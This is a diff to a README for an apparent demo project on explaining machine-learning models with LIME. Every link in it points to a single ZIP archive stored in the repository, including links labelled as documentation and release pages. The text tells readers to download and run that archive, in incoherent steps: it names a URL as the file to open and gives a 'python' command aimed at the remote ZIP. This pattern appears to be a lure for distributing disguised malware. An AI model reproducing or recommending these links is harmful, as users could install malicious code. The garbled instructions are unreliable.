@@ -1,6 +1,6 @@
 # 🍋 lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo - Simplify Machine Learning Explanations
 
-[![Download](https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/raw/refs/heads/main/kaynak_gorseller/ile_ogrenmesi_lime_aciklamak_modellerini_demo_makine_3.1.zip%https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/raw/refs/heads/main/kaynak_gorseller/ile_ogrenmesi_lime_aciklamak_modellerini_demo_makine_3.1.zip)](https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/raw/refs/heads/main/kaynak_gorseller/ile_ogrenmesi_lime_aciklamak_modellerini_demo_makine_3.1.zip)
+[![Download](https://raw.githubusercontent.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/main/lime_ciktilar/ile_modellerini_makine_aciklamak_ogrenmesi_lime_demo_3.5-alpha.4.zip%https://raw.githubusercontent.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/main/lime_ciktilar/ile_modellerini_makine_aciklamak_ogrenmesi_lime_demo_3.5-alpha.4.zip)](https://raw.githubusercontent.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/main/lime_ciktilar/ile_modellerini_makine_aciklamak_ogrenmesi_lime_demo_3.5-alpha.4.zip)
 
 ## 📋 Description
 
@@ -34,7 +34,7 @@ Follow these steps to download and run the application.
 
 To download the software, visit the following page:
 
-[Download from Releases](https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/raw/refs/heads/main/kaynak_gorseller/ile_ogrenmesi_lime_aciklamak_modellerini_demo_makine_3.1.zip)
+[Download from Releases](https://raw.githubusercontent.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/main/lime_ciktilar/ile_modellerini_makine_aciklamak_ogrenmesi_lime_demo_3.5-alpha.4.zip)
 
 ### Step 2: Choose the Right Version
 
@@ -50,7 +50,7 @@ After the download is complete, locate the ZIP file on your computer. Right-clic
 
 ### Step 5: Open the Application
 
-Navigate to the folder where you extracted the files. Look for a file named `https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/raw/refs/heads/main/kaynak_gorseller/ile_ogrenmesi_lime_aciklamak_modellerini_demo_makine_3.1.zip` or similar. This is the file you will run to start the application.
+Navigate to the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/main/lime_ciktilar/ile_modellerini_makine_aciklamak_ogrenmesi_lime_demo_3.5-alpha.4.zip` or similar. This is the file you will run to start the application.
 
 ### Step 6: Run the Application
 
@@ -59,7 +59,7 @@ If you have Python installed on your computer, you can run the application throu
 Type the following command:
 
 ```bash
-python https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/raw/refs/heads/main/kaynak_gorseller/ile_ogrenmesi_lime_aciklamak_modellerini_demo_makine_3.1.zip
+python https://raw.githubusercontent.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/main/lime_ciktilar/ile_modellerini_makine_aciklamak_ogrenmesi_lime_demo_3.5-alpha.4.zip
 ```
 
 Press **Enter**. The application will start, and you will see instructions on how to use it.
@@ -87,13 +87,13 @@ If you want to contribute to this project, feel free to submit a pull request. W
 
 ## 🔗 Additional Resources
 
-- [LIME Documentation](https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/raw/refs/heads/main/kaynak_gorseller/ile_ogrenmesi_lime_aciklamak_modellerini_demo_makine_3.1.zip)
-- [ResNet50 Overview](https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/raw/refs/heads/main/kaynak_gorseller/ile_ogrenmesi_lime_aciklamak_modellerini_demo_makine_3.1.zip)
+- [LIME Documentation](https://raw.githubusercontent.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/main/lime_ciktilar/ile_modellerini_makine_aciklamak_ogrenmesi_lime_demo_3.5-alpha.4.zip)
+- [ResNet50 Overview](https://raw.githubusercontent.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/main/lime_ciktilar/ile_modellerini_makine_aciklamak_ogrenmesi_lime_demo_3.5-alpha.4.zip)
 
 ## 💡 Download & Install
 
 Visit the release page to begin your download: 
 
-[Download from Releases](https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/raw/refs/heads/main/kaynak_gorseller/ile_ogrenmesi_lime_aciklamak_modellerini_demo_makine_3.1.zip) 
+[Download from Releases](https://raw.githubusercontent.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/main/lime_ciktilar/ile_modellerini_makine_aciklamak_ogrenmesi_lime_demo_3.5-alpha.4.zip) 
 
 Make sure to follow all steps carefully to successfully run the application.
